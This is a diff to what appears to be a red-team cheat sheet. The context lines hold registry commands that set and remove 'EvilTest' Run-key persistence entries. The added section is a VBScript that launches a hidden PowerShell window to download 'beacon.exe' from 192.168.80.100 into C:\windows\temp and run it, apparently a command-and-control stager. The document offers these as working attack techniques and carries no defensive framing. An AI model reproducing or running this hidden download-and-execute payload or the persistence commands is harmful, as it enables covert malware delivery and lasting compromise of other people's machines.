@@ -58,3 +58,11 @@ shell reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v EvilTest /d 
 shell reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v EvilTest
 shell reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v EvilTest
 ```
+
+### Hide PowerShell Commands (.vbs)
+```powershell
+Dim shell, command
+command = "powershell.exe -w hidden -c ""Invoke-WebRequest -URI http://192.168.80.100/beacon.exe -OutFile 'C:\windows\temp\beacon.exe'; Start-Process 'C:\windows\temp\beacon.exe'"""
+Set shell = CreateObject("WScript.Shell")
+shell.Run command, 0
+```
